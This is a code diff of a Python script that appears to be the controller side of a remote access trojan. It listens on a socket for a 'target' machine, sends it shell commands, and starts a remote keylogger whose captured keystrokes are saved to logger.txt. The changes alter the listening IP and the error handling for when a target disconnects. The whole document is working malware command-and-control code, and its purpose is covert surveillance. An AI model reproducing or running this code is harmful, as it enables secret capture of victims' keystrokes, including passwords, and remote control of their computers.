@@ -4,7 +4,7 @@ import sys
 
 sock = st.socket(st.AF_INET,st.SOCK_STREAM)
 sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
-sock.bind(('192.168.6.54',2222))
+sock.bind(('192.168.6.190',2222))
 sock.listen()
 
 con,addr = sock.accept()
@@ -38,17 +38,15 @@ try:
 
             elif cmd == 'log keys':
                 con.send(cmd.encode())
+                print('start keylogger...')
                 try:
-                    print('start keylogger...')
                     while True:
                         getlogs = con.recv(1024).decode()
                         with open('logger.txt','a') as log:
                             log.write(getlogs)
-                except Exception as e:
-                    print(e)
                 except KeyboardInterrupt:
-                    print('Keylogger stopped')
-                    continue
+                    log.close()
+                continue
             elif cmd in ('quite','exit'):
                 con.close()
                 system('clear')
@@ -62,6 +60,9 @@ try:
                 output = con.recv(1168).decode()
                 print(output,end='\n',flush=True)
                 continue
+except ConnectionResetError:
+    print(f'Target disconected with IP : {addr[0]} and PORT : {addr[1]}')   
+    sys.exit()
 
 except Exception as err:
     print(err)
